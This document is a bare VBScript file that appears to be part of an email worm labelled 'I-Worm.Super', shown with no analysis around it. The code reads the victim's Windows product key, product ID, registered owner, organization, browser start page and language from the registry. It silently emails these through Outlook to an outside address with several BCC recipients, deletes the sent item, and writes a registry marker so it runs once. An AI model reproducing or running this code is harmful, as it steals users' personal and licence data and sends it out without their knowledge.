On Error Resume Next
Set ws=CreateObject("WScript.Shell")
verif=ws.RegRead("HKLM\Software\Microsoft\SuperWorm\")
If verif <> "send" Then
ro1=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
ro2=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
pk=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey")
pi=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId")
ver=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Version")
vern=ws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
sp=ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
ld=ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage")
Set OA=CreateObject("Outlook.Application")
Set EM=OA.CreateItem(0)
EM.To="petik@multimania.com"
EM.BCC = "support@microsoft.com; support@avx.com; nimda-request@sophos.com"
EM.Subject="I am infected by I-Worm.Super !!"
body="My name is " & ro1 & ","
body = body & VbCrLf & "I was infected by I-Worm.Super :-("
body = body & VbCrLf & "It was on "& date & " at " & time & "."
body = body & VbCrLf & ""
body = body & VbCrLf & "If you want some informations about me :"
body = body & VbCrLf & "My registered owner : " & ro1
body = body & VbCrLf & "My registered organization : " & ro2
body = body & VbCrLf & "My Product Key : " & pk
body = body & VbCrLf & "My Product Indentification : " & pi
body = body & VbCrLf & "My version of Windows : " & ver & " " & vern
body = body & VbCrLf & "My start page of MSIE : " & sp
body = body & VbCrLf & "My country : " & ld
body = body & VbCrLf & ""
body = body & VbCrLf & "Please help me !"
body = body & VbCrLf & "Thank you very much."
EM.Body=body
EM.DeleteAfterSubmit=True
EM.Send
ws.RegWrite "HKLM\Software\Microsoft\SuperWorm\","send"
End If
